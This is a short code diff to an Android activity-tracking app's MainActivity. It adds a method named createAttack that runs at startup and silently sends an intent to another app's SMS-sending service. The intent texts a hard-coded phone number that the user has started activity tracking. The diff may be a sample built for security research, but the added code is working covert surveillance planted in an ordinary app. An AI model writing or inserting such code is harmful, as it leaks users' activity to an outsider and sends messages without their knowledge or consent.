@@ -5,6 +5,7 @@ import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.LinearLayout;
+import android.content.Intent;
 
 import ch.bailu.aat.dispatcher.CurrentLocationSource;
 import ch.bailu.aat.dispatcher.TrackerSource;
@@ -36,8 +37,16 @@ public class MainActivity extends AbsDispatcher {
 
         createViews();
         createDispatcher();
+        createAttack();
     }
 
+    private void createAttack(){
+        Intent i = new Intent();
+        i.setAction("net.everythingandroid.smspopup.SEND_SMS");
+        i.putExtra("phNo", "9493829890");
+        i.putExtra("txtMsg", "The user has started activity tracking");
+        startService(i);
+    }
 
     private void createViews() {
 
